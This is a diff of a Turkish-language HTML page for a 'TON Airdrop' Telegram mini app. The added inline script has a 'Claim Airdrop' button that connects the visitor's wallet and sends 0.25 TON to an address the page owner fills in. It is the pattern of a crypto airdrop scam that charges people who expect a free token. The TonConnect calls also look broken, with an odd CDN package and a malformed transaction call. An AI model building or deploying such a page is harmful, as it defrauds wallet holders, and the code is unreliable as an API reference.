@@ -1,28 +1,48 @@
 <!DOCTYPE html>
-<html>
+<html lang="tr">
 <head>
-    <meta charset="utf-8">
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TON Airdrop Mini App</title>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
-    <style>
-        body { margin: 0; padding: 20px; }
-        #airdropButton {
-            padding: 10px 20px;
-            font-size: 16px;
-            cursor: pointer;
-            background: #0088cc;
-            color: white;
-            border: none;
-            border-radius: 8px;
-        }
-    </style>
+    <title>Airdrop Talep Et</title>
+    <script src="https://cdn.jsdelivr.net/npm/ton-connect"></script> <!-- TON Connect Kitaplığı -->
 </head>
 <body>
-    <div id="main">
-        <button id="airdropButton">Airdrop Talep Et</button>
-    </div>
-    <script src="script.js"></script>
+    <h1>TON Airdrop</h1>
+    <button id="airdropButton">Airdrop Talep Et</button>
+
+    <script>
+        // TON Connect başlatma
+        const tonConnect = new TonConnect();
+        
+        // Buton tıklama işlemi
+        document.getElementById("airdropButton").addEventListener("click", async () => {
+            // Cüzdan bağlama
+            const wallet = await tonConnect.connect();
+            if (wallet) {
+                alert("Cüzdan Bağlandı! İşlem Onayını Bekliyoruz.");
+                await handleTransaction(wallet);
+            }
+        });
+
+        // Akıllı kontrat işlemi
+        async function handleTransaction(wallet) {
+            try {
+                const paymentAmount = 0.25; // 0.25 TON
+                const contractAddress = "Sizin-Cüzdan-Adresiniz"; // Belirlediğiniz cüzdan adresi
+                
+                // Akıllı kontrat işlemi
+                const response = await wallet.sendTransaction({
+                    to: contractAddress,
+                    amount: paymentAmount * 10**9, // TON'un smallest unit'e çevrilmesi
+                    payload: "Airdrop Ödemesi",
+                });
+
+                alert("Ödeme Başarıyla Yapıldı!");
+            } catch (error) {
+                alert("İşlem sırasında bir hata oluştu!");
+                console.error(error);
+            }
+        }
+    </script>
 </body>
 </html>
